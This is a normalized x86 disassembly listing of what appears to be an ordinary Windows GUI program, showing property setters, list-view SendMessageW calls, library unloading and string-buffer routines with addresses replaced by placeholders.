call j_sub_449348
retn
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afb6c
push ebx
mov ebx eax
cmp edx [ ebx + 0x28 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x28 ] edx
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afb94
push ebx
mov ebx eax
cmp edx [ ebx + 0x2c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2c ] edx
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afbbc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push j_sub_448b58#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4afc2c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
mov eax [ ebx + 0x4 ]
call sub_4aff88
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4aff88
call sub_4ac8e8
sub_4afc30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_449d2c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_425198
sub_4afc5c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi esi
mov eax edi
call sub_4afe60
mov [ ebx + 0x14 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_4250f4
movzx eax [ r-xdata ]
mov [ ebx + 0x18 ] ax
mov [ ebx + 0x1a ] 0x0
mov [ ebx + 0x1b ] 0x0
mov [ ebx + 0x28 ] 0xffffffff
mov [ ebx + 0x2c ] 0xffffffff
mov [ ebp - 0x64 ] 0x60
mov [ ebp - 0x60 ] 0x14
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
mov eax edi
call sub_4aff88
call sub_496c14
test al al
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax edi
call sub_4aff88
call sub_496868
mov esi eax
mov eax ebx
call sub_425180
lea edx [ ebp - 0x64 ]
push edx
push eax
push 0x1091
push esi
call SendMessageW
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4afd22
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
call sub_44873c
mov [ esp ] dl
mov ebp eax
mov eax [ ebp + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x4 ]
call sub_4aff88
call sub_496c14
test al al
je r-xdata
mov eax [ esp + 0x4 ]
call sub_4aff88
mov edi [ eax + 0x28c ]
mov eax edi
call sub_4a81b8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4aff88
call sub_496868
push 0x0
mov edx [ ebp + 0x14 ]
push edx
push 0x1096
push eax
call SendMessageW
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_42512c
mov eax [ esp + 0x4 ]
call sub_4afeb0
cmp [ esp ] 0x0
jle r-xdata
inc esi
xor ebx ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_4a81f0
or edx 0xffffffff
call sub_4a7b44
mov edx ebx
mov eax edi
call sub_4a81f0
mov eax [ eax + 0x2c ]
cmp eax [ ebp + 0x14 ]
jne r-xdata
sub_4afde0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
pop esi
pop ebx
retn
mov edx [ esi + 0xc ]
mov eax ebx
call sub_4af63c
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4af6b0
mov eax esi
call sub_4af8e0
mov edx eax
mov eax ebx
call sub_4af988
movzx edx [ esi + 0x1a ]
mov eax ebx
call sub_4af9c0
movzx edx [ esi + 0x1b ]
mov eax ebx
call sub_4af9e8
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_4afa10
pop esi
pop ebx
retn
sub_4afe60
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov eax edi
call sub_4254d8
test eax eax
je r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax edi
call sub_4254d8
dec eax
cmp ebx eax
je r-xdata
inc ebp
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_4afe4c
cmp ebp [ eax + 0x14 ]
jne r-xdata
jmp r-xdata
sub_4afeb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4aff88
call sub_496c14
test al al
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push j_sub_448b58#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4aff88
call sub_4ac8e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4aff10
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_4aff88
call sub_4ac8e8
pop esi
pop ebx
retn
mov eax esi
call sub_425180
push eax
mov eax ebx
call sub_4aff88
pop edx
call sub_4ac9f4
pop esi
pop ebx
retn
sub_4aff44
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4252bc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4aff8c
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx rw-data
mov eax [ edi ]
call sub_4248a0
mov edx rw-data
mov eax [ edi ]
call sub_4248a0
mov eax [ edi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ edi ] edx
call sub_4481b0
inc ebx
xor esi esi
mov edx esi
mov eax [ edi ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_44ab74
inc esi
dec ebx
jne r-xdata
sub_4affe8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4b005c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4b0063
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
call sub_4aff8c
mov eax rw-data
mov edx [ r-xdata ]
call sub_44a798
mov eax rw-data
mov edx [ r-xdata ]
call sub_44a798
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4b0068
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_424590
mov edx rw-data
mov eax [ rw-data ]
call sub_424590
sub_4b00a4
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_448b58
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4b00dc
retn
mov eax [ rw-data ]
call sub_4481b0
sub_4b0158
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_4b0180
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_4c429c
pop ecx
sub_4b0234
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebx ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
push ebx
call sub_4b0180
pop ecx
test [ ebp + 0xc ] 0x1
je r-xdata
sub_4b0264
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
dec [ ebp - 0x8 ]
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edx rw-data
mov [ ebx ] edx
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4b02b0
push ebp
mov ebp esp
add esp 0xfffffa7c
mov eax rw-data
push ebx
push esi
push edi
lea edi [ ebp - 0xb0 ]
mov ebx [ ebp + 0x8 ]
lea esi [ ebp - 0x58 ]
call sub_4c517c
mov edx [ ebp + 0xc ]
and edx 0x17
mov [ ebx + 0x10 ] edx
mov ecx [ ebx + 0x10 ]
and ecx [ ebx + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x12c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
and eax [ ebx + 0x14 ]
and eax 0x4
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
jmp r-xdata
mov edx [ ebx + 0x10 ]
and edx [ ebx + 0x14 ]
and edx 0x2
test edx edx
je r-xdata
lea edx [ ebp - 0x12c ]
lea ecx [ ebp - 0x134 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x11c ] 0x18
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x134 ]
push eax
lea edx [ esi + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ esi + 0x24 ] ecx
mov [ ebp - 0x135 ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea edx [ ebp - 0x12c ]
lea ecx [ ebp - 0x414 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x11c ] 0x78
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x414 ]
push eax
lea edx [ ebp - 0x100 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebp - 0xe4 ] ecx
mov [ ebp - 0x415 ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x12c ]
lea eax [ ebp - 0x2a4 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x11c ] 0x48
push eax
call sub_408628
pop ecx
lea edx [ ebp - 0x2a4 ]
push edx
lea ecx [ edi + 0x8 ]
push ecx
call sub_408650
add esp 0x8
mov eax 0xf
mov [ edi + 0x24 ] eax
mov [ ebp - 0x2a5 ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
lea edx [ edi + 0x10 ]
mov edx [ edi + 0x10 ]
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ esi + 0x24 ] 0x10
mov edx rw-data
jb r-xdata
xor edx edx
mov [ esi + 0x20 ] edx
add eax edx
mov [ ebp - 0x13c ] eax
mov eax [ ebp - 0x13c ]
mov cl [ ebp - 0x135 ]
mov [ eax ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov ebx eax
mov eax rw-data
test eax eax
je r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0xe4 ] 0x10
mov edx rw-data
jb r-xdata
xor edx edx
mov [ ebp - 0xe8 ] edx
add eax edx
mov [ ebp - 0x41c ] eax
mov eax [ ebp - 0x41c ]
mov cl [ ebp - 0x415 ]
mov [ eax ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov [ ebp - 0x420 ] eax
mov eax rw-data
test eax eax
je r-xdata
xor edx edx
jmp r-xdata
cmp [ edi + 0x24 ] 0x10
mov edx rw-data
jb r-xdata
xor eax eax
mov [ edi + 0x20 ] eax
add edx eax
mov [ ebp - 0x2ac ] edx
mov edx [ ebp - 0x2ac ]
mov cl [ ebp - 0x2a5 ]
mov [ edx ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov ebx eax
mov eax rw-data
test eax eax
je r-xdata
test dl dl
je r-xdata
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
test dl dl
je r-xdata
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
test dl dl
je r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
lea edx [ esi + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x1c8 ] eax
cmp [ ebp - 0x1c8 ] 0x1
ja r-xdata
cmp [ esi + 0x24 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ esi + 0x24 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
lea edx [ ebp - 0x100 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x4b0 ] eax
cmp [ ebp - 0x4b0 ] 0x1
ja r-xdata
cmp [ ebp - 0xe4 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
lea edx [ edi + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x338 ] eax
cmp [ ebp - 0x338 ] 0x1
ja r-xdata
cmp [ edi + 0x24 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ edi + 0x24 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
mov ecx [ ebp - 0x1c8 ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x4b0 ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
mov ecx [ ebp - 0x338 ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
cmp ebx [ esi + 0x24 ]
jbe r-xdata
push esi
call sub_4bbca8
pop ecx
cmp ebx ecx
jbe r-xdata
mov edx [ esi + 0x20 ]
sub edx [ ebp - 0x140 ]
mov [ ebp - 0x144 ] edx
cmp ebx [ ebp - 0x144 ]
jae r-xdata
push esi
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x140 ] eax
mov eax [ esi + 0x20 ]
cmp eax [ ebp - 0x140 ]
jae r-xdata
mov dl 0x1
add eax [ esi + 0x20 ]
cmp eax rw-data
ja r-xdata
mov edx [ ebp - 0xe4 ]
cmp edx [ ebp - 0x420 ]
jae r-xdata
lea eax [ ebp - 0x108 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x420 ]
jae r-xdata
mov eax [ ebp - 0xe8 ]
sub eax [ ebp - 0x424 ]
mov [ ebp - 0x428 ] eax
mov edx [ ebp - 0x420 ]
cmp edx [ ebp - 0x428 ]
jae r-xdata
lea edx [ ebp - 0x108 ]
push edx
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x424 ] eax
mov eax [ ebp - 0xe8 ]
cmp eax [ ebp - 0x424 ]
jae r-xdata
mov dl 0x1
add eax [ ebp - 0xe8 ]
cmp eax rw-data
ja r-xdata
cmp ebx [ edi + 0x24 ]
jbe r-xdata
push edi
call sub_4bbca8
pop ecx
cmp ebx ecx
jbe r-xdata
mov edx [ edi + 0x20 ]
sub edx [ ebp - 0x2b0 ]
mov [ ebp - 0x2b4 ] edx
cmp ebx [ ebp - 0x2b4 ]
jae r-xdata
push edi
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x2b0 ] eax
mov eax [ edi + 0x20 ]
cmp eax [ ebp - 0x2b0 ]
jae r-xdata
mov dl 0x1
add eax [ edi + 0x20 ]
cmp eax rw-data
ja r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi + 0x20 ]
push eax
push ebx
push esi
call sub_408678
add esp 0xc
jmp r-xdata
cmp esi esi
jne r-xdata
mov [ ebp - 0x144 ] ebx
cmp [ ebp - 0x420 ] 0x0
jne r-xdata
mov eax [ ebp - 0xe8 ]
push eax
mov edx [ ebp - 0x420 ]
push edx
lea ecx [ ebp - 0x108 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x108 ]
lea edx [ ebp - 0x108 ]
cmp eax edx
jne r-xdata
mov ecx [ ebp - 0x420 ]
mov [ ebp - 0x428 ] ecx
test ebx ebx
jne r-xdata
mov eax [ edi + 0x20 ]
push eax
push ebx
push edi
call sub_408678
add esp 0xc
jmp r-xdata
cmp edi edi
jne r-xdata
mov [ ebp - 0x2b4 ] ebx
test ebx ebx
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x1e1 ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov edi [ ebp - 0x144 ]
lea eax [ esi + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x18c ] eax
cmp [ ebp - 0x18c ] 0x1
ja r-xdata
mov [ ebp - 0x148 ] 0xffffffff
mov eax [ ebp - 0x140 ]
add eax [ ebp - 0x144 ]
mov [ ebp - 0x14c ] eax
mov edx [ esi + 0x20 ]
cmp edx [ ebp - 0x14c ]
jae r-xdata
cmp [ ebp - 0x420 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x4c9 ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov eax [ ebp - 0x428 ]
mov [ ebp - 0x470 ] eax
lea edx [ ebp - 0x100 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x474 ] eax
cmp [ ebp - 0x474 ] 0x1
ja r-xdata
mov [ ebp - 0x42c ] 0xffffffff
mov ecx [ ebp - 0x424 ]
add ecx [ ebp - 0x428 ]
mov [ ebp - 0x430 ] ecx
mov eax [ ebp - 0xe8 ]
cmp eax [ ebp - 0x430 ]
jae r-xdata
test ebx ebx
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x351 ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
mov esi [ ebp - 0x2b4 ]
lea eax [ edi + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x2fc ] eax
cmp [ ebp - 0x2fc ] 0x1
ja r-xdata
mov [ ebp - 0x2b8 ] 0xffffffff
mov eax [ ebp - 0x2b0 ]
add eax [ ebp - 0x2b4 ]
mov [ ebp - 0x2bc ] eax
mov edx [ edi + 0x20 ]
cmp edx [ ebp - 0x2bc ]
jae r-xdata
mov eax esi
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x18c ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub ecx [ ebp - 0x14c ]
cmp ecx [ ebp - 0x148 ]
jae r-xdata
push esi
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x108 ]
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
mov ecx [ ebp - 0x474 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0xe8 ]
sub ecx [ ebp - 0x430 ]
cmp ecx [ ebp - 0x42c ]
jae r-xdata
lea edx [ ebp - 0x108 ]
push edx
call sub_4bc8cc
pop ecx
mov eax edi
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x2fc ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ edi + 0x20 ]
sub ecx [ ebp - 0x2bc ]
cmp ecx [ ebp - 0x2b8 ]
jae r-xdata
push edi
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
lea edx [ esi + 0x10 ]
mov edx [ esi + 0x10 ]
jmp r-xdata
xor edx edx
mov [ esi + 0x20 ] edx
add eax edx
mov [ ebp - 0x1e8 ] eax
mov eax [ ebp - 0x1e8 ]
mov cl [ ebp - 0x1e1 ]
mov [ eax ] cl
cmp edi [ esi + 0x24 ]
jbe r-xdata
push esi
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0x148 ] 0x0
jbe r-xdata
mov eax [ esi + 0x20 ]
sub eax [ ebp - 0x14c ]
mov [ ebp - 0x148 ] eax
lea ecx [ ebp - 0xc8 ]
mov ecx [ ebp - 0xc8 ]
jmp r-xdata
lea edx [ ebp - 0xf8 ]
mov edx [ ebp - 0xf8 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xe8 ] edx
add eax edx
mov [ ebp - 0x4d0 ] eax
mov eax [ ebp - 0x4d0 ]
mov cl [ ebp - 0x4c9 ]
mov [ eax ] cl
mov edx [ ebp - 0xe4 ]
cmp edx [ ebp - 0x470 ]
jae r-xdata
lea eax [ ebp - 0x108 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x470 ]
jae r-xdata
cmp [ ebp - 0x42c ] 0x0
jbe r-xdata
mov eax [ ebp - 0xe8 ]
sub eax [ ebp - 0x430 ]
mov [ ebp - 0x42c ] eax
lea ecx [ ebp - 0x70 ]
mov ecx [ ebp - 0x70 ]
jmp r-xdata
lea edx [ edi + 0x10 ]
mov edx [ edi + 0x10 ]
jmp r-xdata
xor edx edx
mov [ edi + 0x20 ] edx
add eax edx
mov [ ebp - 0x358 ] eax
mov eax [ ebp - 0x358 ]
mov cl [ ebp - 0x351 ]
mov [ eax ] cl
cmp esi [ edi + 0x24 ]
jbe r-xdata
push edi
call sub_4bbca8
pop ecx
cmp esi edx
jbe r-xdata
cmp [ ebp - 0x2b8 ] 0x0
jbe r-xdata
mov eax [ edi + 0x20 ]
sub eax [ ebp - 0x2bc ]
mov [ ebp - 0x2b8 ] eax
mov edx [ esi + 0x20 ]
mov [ ebp - 0x208 ] edx
cmp [ ebp - 0x208 ] 0xffffffff
jbe r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x204 ] ecx
mov edx [ ebp - 0x204 ]
mov cl [ ebp - 0x1fd ]
mov [ edx ] cl
cmp [ esi + 0x20 ] 0x0
jae r-xdata
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x1ec ] edx
push ebx
push rw-data
mov eax [ ebp - 0x1ec ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x1ed ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x20 ]
push eax
push edi
push esi
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x140 ]
mov [ ebp - 0x16c ] eax
cmp [ esi + 0x20 ] 0x0
jae r-xdata
mov edx [ esi + 0x20 ]
sub edx [ ebp - 0x14c ]
sub edx [ ebp - 0x148 ]
mov [ ebp - 0x150 ] edx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0xe8 ]
mov [ ebp - 0x4f0 ] edx
cmp [ ebp - 0x4f0 ] 0xffffffff
jbe r-xdata
lea eax [ ebp - 0xd8 ]
push eax
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0xb8 ] eax
add ecx eax
mov [ ebp - 0x4ec ] ecx
mov edx [ ebp - 0x4ec ]
mov cl [ ebp - 0x4e5 ]
mov [ edx ] cl
cmp [ ebp - 0xe8 ] 0x0
jae r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
mov [ ebp - 0x4d4 ] edx
mov eax [ ebp - 0x420 ]
push eax
push rw-data
mov ecx [ ebp - 0x4d4 ]
push ecx
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x4d5 ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
cmp [ ebp - 0x470 ] 0x0
jne r-xdata
mov eax [ ebp - 0xe8 ]
push eax
mov edx [ ebp - 0x470 ]
push edx
lea ecx [ ebp - 0x108 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x424 ]
mov [ ebp - 0x450 ] eax
cmp [ ebp - 0xe8 ] 0x0
jae r-xdata
mov edx [ ebp - 0xe8 ]
sub edx [ ebp - 0x430 ]
sub edx [ ebp - 0x42c ]
mov [ ebp - 0x434 ] edx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov edx [ edi + 0x20 ]
mov [ ebp - 0x378 ] edx
cmp [ ebp - 0x378 ] 0xffffffff
jbe r-xdata
lea eax [ ebp - 0x80 ]
push eax
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x60 ] eax
add ecx eax
mov [ ebp - 0x374 ] ecx
mov edx [ ebp - 0x374 ]
mov cl [ ebp - 0x36d ]
mov [ edx ] cl
cmp [ edi + 0x20 ] 0x0
jae r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x35c ] edx
push ebx
push rw-data
mov eax [ ebp - 0x35c ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x35d ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x20 ]
push eax
push esi
push edi
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x2b0 ]
mov [ ebp - 0x2dc ] eax
cmp [ edi + 0x20 ] 0x0
jae r-xdata
mov edx [ edi + 0x20 ]
sub edx [ ebp - 0x2bc ]
sub edx [ ebp - 0x2b8 ]
mov [ ebp - 0x2c0 ] edx
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x28 ]
cmp ecx esi
jne r-xdata
mov [ ebp - 0x208 ] 0xffffffff
mov [ esi + 0x20 ] ebx
add ecx ebx
mov [ ebp - 0x1f4 ] ecx
mov eax [ ebp - 0x1f4 ]
mov dl [ ebp - 0x1ed ]
mov [ eax ] dl
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x1a5 ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov edx [ esi + 0x20 ]
cmp edx [ ebp - 0x16c ]
jae r-xdata
push esi
call sub_4bc8cc
pop ecx
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
lea ecx [ ebp - 0xd8 ]
lea eax [ ebp - 0x108 ]
cmp ecx eax
jne r-xdata
mov [ ebp - 0x4f0 ] 0xffffffff
mov edx [ ebp - 0x420 ]
mov [ ebp - 0xe8 ] edx
add eax edx
mov [ ebp - 0x4dc ] eax
mov eax [ ebp - 0x4dc ]
mov cl [ ebp - 0x4d5 ]
mov [ eax ] cl
cmp [ ebp - 0x470 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x48d ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xe8 ]
cmp ecx [ ebp - 0x450 ]
jae r-xdata
